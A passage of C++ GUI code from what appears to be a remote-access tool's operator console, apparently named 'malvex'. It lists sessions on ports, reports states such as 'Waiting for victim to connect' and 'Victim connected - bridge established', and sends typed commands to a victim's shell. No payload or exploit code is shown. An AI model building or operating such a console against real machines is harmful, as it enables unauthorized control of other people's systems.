    } else if (sessions.size() < last_session_count && selected_session >= static_cast<int>(sessions.size())) {
        selected_session = sessions.empty() ? -1 : static_cast<int>(sessions.size()) - 1;
        last_reported_state = SessionBridgeState::Closed;
    }
    last_session_count = sessions.size();

    auto body = ui::section_content(page);

    if (sessions.empty()) {
        draw_malvex_panel(body, "Currently there are no active Sessions!", panel_fill, panel_border);
        selected_session = -1;
        last_reported_state = SessionBridgeState::Closed;
        return;
    }

    if (selected_session < 0 || selected_session >= static_cast<int>(sessions.size())) {
        selected_session = 0;
    }

    float session_chip_x = body.x;
    for (size_t i = 0; i < sessions.size(); ++i) {
        int original_base = GuiGetStyle(BUTTON, BASE_COLOR_NORMAL);
        int original_text = GuiGetStyle(BUTTON, TEXT_COLOR_NORMAL);

        if (selected_session == static_cast<int>(i)) {
            GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, ColorToInt({150, 30, 70, 255}));
            GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, ColorToInt({255, 230, 120, 255}));
        }

        const Rectangle chip{session_chip_x, body.y, 34.0f, ui::kControlHeight};
        if (GuiButton(chip, TextFormat("%d", static_cast<int>(i)))) {
            selected_session = static_cast<int>(i);
            last_reported_state = SessionBridgeState::Closed;
        }

        GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, original_base);
        GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, original_text);
        session_chip_x += chip.width + 6.0f;
    }

    Rectangle session_panel{
        body.x,
        body.y + ui::kControlHeight + ui::kGap,
        body.width,
        std::max(0.0f, body.height - ui::kControlHeight - ui::kGap),
    };

    const SessionDAO& session = sessions.at(selected_session);
    const auto bridge_state = sessionMan.getBridgeState(session);
    const bool session_ready = bridge_state == SessionBridgeState::Ready;

    const char* status_text = "Unknown";
    Color status_color = GRAY;
    switch (bridge_state) {
        case SessionBridgeState::Connecting:
            status_text = "Connecting to session server...";
            status_color = ORANGE;
            break;
        case SessionBridgeState::WaitingForVictim:
            status_text = "Waiting for victim to connect...";
            status_color = GOLD;
            break;
        case SessionBridgeState::Ready:
            status_text = "Bridge established - shell ready";
            status_color = GREEN;
            break;
        case SessionBridgeState::Failed:
            status_text = "Session connection failed";
            status_color = RED;
            break;
        case SessionBridgeState::Closed:
            status_text = "Session closed";
            status_color = MAROON;
            break;
    }

    if (bridge_state != last_reported_state) {
        const char* transition_message = nullptr;
        switch (bridge_state) {
            case SessionBridgeState::Connecting:
                transition_message = "\n[Session] Connecting to session server...\n";
                break;
            case SessionBridgeState::WaitingForVictim:
                transition_message = "\n[Session] Waiting for victim to connect...\n";
                break;
            case SessionBridgeState::Ready:
                transition_message = "\n[Session] Victim connected - bridge established.\n";
                break;
            case SessionBridgeState::Failed:
                transition_message = "\n[Session] Connection failed.\n";
                break;
            case SessionBridgeState::Closed:
                transition_message = "\n[Session] Session closed.\n";
                break;
        }

        if (transition_message != nullptr
            && strlen(terminalOutput) + strlen(transition_message) < sizeof(terminalOutput) - 1) {
            strcat(terminalOutput, transition_message);
        }

        last_reported_state = bridge_state;
    }

    draw_malvex_panel(
        session_panel,
        TextFormat("Session [%s] on port [%d]", session.uid.c_str(), session.port),
        panel_fill,
        panel_border);

    DrawTextEx(
        state.font,
        status_text,
        {session_panel.x + ui::kPadding, session_panel.y + 34.0f},
        16.0f,
        1.0f,
        status_color);

    if (GuiButton(
            {session_panel.x + session_panel.width - ui::kPadding - 130.0f, session_panel.y + 8.0f, 130.0f, ui::kControlHeight},
            GuiIconText(ICON_CROSS, "Close Shell"))) {
        if (state.client.closeSession(session.port)) {
            sessionMan.close(session.uid);
            last_reported_state = SessionBridgeState::Closed;
        }
    }

    const auto panel_body = ui::panel_body(session_panel, true);
    const float command_bar_height = ui::kControlHeight + ui::kPadding;

    Rectangle outputRect{
        panel_body.x,
        panel_body.y + 20.0f,
        panel_body.width,
        std::max(0.0f, panel_body.height - command_bar_height - 28.0f),
    };

    ui::draw_rounded_rect(outputRect, {24, 24, 32, 255}, {60, 60, 74, 255});
    DrawTextEx(state.font, "Session Output", {outputRect.x + ui::kPadding, outputRect.y - 18.0f}, 14.0f, 1.0f, LIGHTGRAY);

    Vector2 textSize = MeasureTextEx(state.font, terminalOutput, 16.0f, 1.0f);

    if (CheckCollisionPointRec(GetMousePosition(), outputRect)) {
        scrollOffset -= GetMouseWheelMove() * 20.0f;

        float maxScroll = textSize.y - outputRect.height + 10.0f;
        if (maxScroll < 0) maxScroll = 0;
        if (scrollOffset < 0) scrollOffset = 0;
        if (scrollOffset > maxScroll) scrollOffset = maxScroll;
    }

    static const int bar_width = 10;
    Rectangle scrollBarBounds{
        outputRect.x + outputRect.width - (bar_width + ui::kPadding),
        outputRect.y + ui::kPadding,
        static_cast<float>(bar_width),
        outputRect.height - ui::kPadding * 2.0f,
    };
    float maxScroll = textSize.y - outputRect.height;
    if (maxScroll < 0) maxScroll = 0;

    if (maxScroll > 0) {
        GuiScrollBar(scrollBarBounds, static_cast<int>(scrollOffset), 0, static_cast<int>(maxScroll));
    }

    BeginScissorMode(
        static_cast<int>(outputRect.x),
        static_cast<int>(outputRect.y),
        static_cast<int>(outputRect.width - bar_width - ui::kPadding),
        static_cast<int>(outputRect.height));

    DrawTextEx(
        state.font,
        terminalOutput,
        Vector2{outputRect.x + ui::kPadding, outputRect.y + ui::kPadding - scrollOffset},
        16.0f,
        1.0f,
        {240, 140, 180, 255});

    EndScissorMode();

    Rectangle command_bar{
        panel_body.x,
        panel_body.y + panel_body.height - command_bar_height,
        panel_body.width,
        command_bar_height,
    };

    DrawTextEx(state.font, ">", {command_bar.x, command_bar.y + 4.0f}, 24.0f, 1.0f, {150, 30, 70, 255});

    const float button_width = 64.0f;
    Rectangle commandRect{
        command_bar.x + 24.0f,
        command_bar.y,
        command_bar.width - button_width * 2.0f - ui::kGap * 3.0f - 24.0f,
        ui::kControlHeight,
    };

    if (!session_ready) {
        GuiDisable();
    }

    if (GuiButton({command_bar.x + command_bar.width - button_width * 2.0f - ui::kGap, command_bar.y, button_width, ui::kControlHeight}, "Run") ||
        GuiTextBox(commandRect, commandInput, 1024, commandEditMode && session_ready)) {
        if (session_ready && strlen(commandInput) > 0) {
            run_terminal_command(commandInput, terminalOutput, 4096, session);
            commandInput[0] = '\0';

            Vector2 newTextSize = MeasureTextEx(state.font, terminalOutput, 16.0f, 1.0f);
            float newMaxScroll = newTextSize.y - outputRect.height;
            if (newMaxScroll > 0) {
                scrollOffset = newMaxScroll;
            }
        }
        commandEditMode = session_ready;
    }

    if (GuiButton({command_bar.x + command_bar.width - button_width, command_bar.y, button_width, ui::kControlHeight}, "Clear")) {
        terminalOutput[0] = '\0';
        strcat(terminalOutput, "Terminal cleared.\n\n");
        scrollOffset = 0;
    }

    if (!session_ready) {
        GuiEnable();
    }
}